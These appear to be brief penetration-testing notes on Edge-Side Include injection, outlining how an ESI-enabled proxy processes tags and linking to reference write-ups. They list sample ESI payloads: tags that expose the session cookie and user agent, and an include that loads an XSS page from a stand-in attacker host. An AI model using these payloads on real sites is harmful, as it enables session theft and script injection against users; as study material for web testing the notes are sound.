# Edge-Side Inclusion

```
    - ESI 
        - https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/
    - Client -> Proxy(load balancer (ESI Engine)) -> Server
    - main.html -> main + ESI Tags 
    - ESI Tags -> ESI Engine -> Variable Fragments -> Client
        <esi:vars>$(HTTP_USER_AGENT)</esi:vars>
        <esi:vars>$(HTTP_COOKIE{'session'})</esi:vars>
        <esi:include src="hacker.com/xss.html"></esi> -> XSS 
        Surrogate-Control content="ESI/1.0"
```

### Methodology

```
        - Fuzzing 
        - Active Scan++
        - https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection
```
